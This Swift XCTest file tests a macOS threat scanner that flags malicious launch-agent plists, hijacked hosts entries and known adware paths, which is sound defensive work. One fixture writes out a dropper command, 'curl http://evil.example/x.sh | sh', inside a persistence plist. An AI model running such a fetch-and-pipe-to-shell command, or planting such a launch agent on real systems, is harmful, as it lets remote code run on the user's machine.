import XCTest
@testable import PureGlassKit

final class ThreatScannerTests: XCTestCase {
    private var dir: URL!
    private let fm = FileManager.default

    override func setUpWithError() throws {
        dir = fm.temporaryDirectory.appending(path: "pgthreat-\(UUID().uuidString)")
        try fm.createDirectory(at: dir, withIntermediateDirectories: true)
    }
    override func tearDownWithError() throws { try? fm.removeItem(at: dir) }

    @discardableResult
    private func writePlist(_ name: String, _ dict: [String: Any]) throws -> URL {
        let url = dir.appending(path: "\(name).plist")
        let data = try PropertyListSerialization.data(fromPropertyList: dict, format: .xml, options: 0)
        try data.write(to: url)
        return url
    }

    private var scanner: ThreatScanner { ThreatScanner(launchDirs: [dir], hostsFile: dir.appending(path: "nohosts"), knownAppPaths: []) }

    func testCleanLaunchAgentNotFlagged() throws {
        let url = try writePlist("clean", [
            "Label": "com.example.helper",
            "ProgramArguments": ["/Applications/Example.app/Contents/MacOS/Helper"]
        ])
        XCTAssertNil(scanner.inspectLaunchPlist(url))
    }

    func testDropperDetected() throws {
        let url = try writePlist("dropper", [
            "Label": "com.x.update",
            "ProgramArguments": ["sh", "-c", "curl http://evil.example/x.sh | sh"]
        ])
        let threat = scanner.inspectLaunchPlist(url)
        XCTAssertEqual(threat?.severity, .malicious)
        XCTAssertEqual(threat?.category, .launchItem)
    }

    func testKnownIndicatorLabelDetected() throws {
        let url = try writePlist("ad", [
            "Label": "com.genieo.engine",
            "ProgramArguments": ["/Users/x/Library/Application Support/Genieo/agent"]
        ])
        let threat = scanner.inspectLaunchPlist(url)
        XCTAssertEqual(threat?.severity, .malicious)
        XCTAssertEqual(threat?.category, .knownMalware)
    }

    func testSuspiciousTmpPathFlagged() throws {
        let url = try writePlist("tmp", [
            "Label": "com.x.thing",
            "ProgramArguments": ["/tmp/hidden_payload"]
        ])
        XCTAssertEqual(scanner.inspectLaunchPlist(url)?.severity, .suspicious)
    }

    func testHostsHijackDetected() {
        let threats = scanner.inspectHosts("1.2.3.4 apple.com\n# comment\n127.0.0.1 ads.example.com")
        XCTAssertEqual(threats.count, 1)
        XCTAssertEqual(threats.first?.category, .hostsHijack)
        XCTAssertEqual(threats.first?.severity, .malicious)
    }

    func testCleanHostsNoThreat() {
        XCTAssertTrue(scanner.inspectHosts("127.0.0.1 localhost\n::1 localhost\n0.0.0.0 ads.tracker.com").isEmpty)
    }

    func testFullScanFindsBadPlist() async throws {
        _ = try writePlist("clean", ["Label": "com.ok.app", "ProgramArguments": ["/usr/bin/true"]])
        _ = try writePlist("bad", ["Label": "com.pirrit.x", "ProgramArguments": ["/tmp/p"]])
        let threats = await ThreatScanner(launchDirs: [dir], hostsFile: dir.appending(path: "nohosts"), knownAppPaths: []).scan()
        XCTAssertEqual(threats.count, 1)
        XCTAssertEqual(threats.first?.severity, .malicious)
    }

    func testKnownAppPathDetected() async throws {
        let pup = dir.appending(path: "FakePUP.app")
        try fm.createDirectory(at: pup, withIntermediateDirectories: true)
        let threats = await ThreatScanner(launchDirs: [], hostsFile: dir.appending(path: "nohosts"), knownAppPaths: [pup]).scan()
        XCTAssertEqual(threats.count, 1)
        XCTAssertEqual(threats.first?.category, .knownMalware)
    }
}
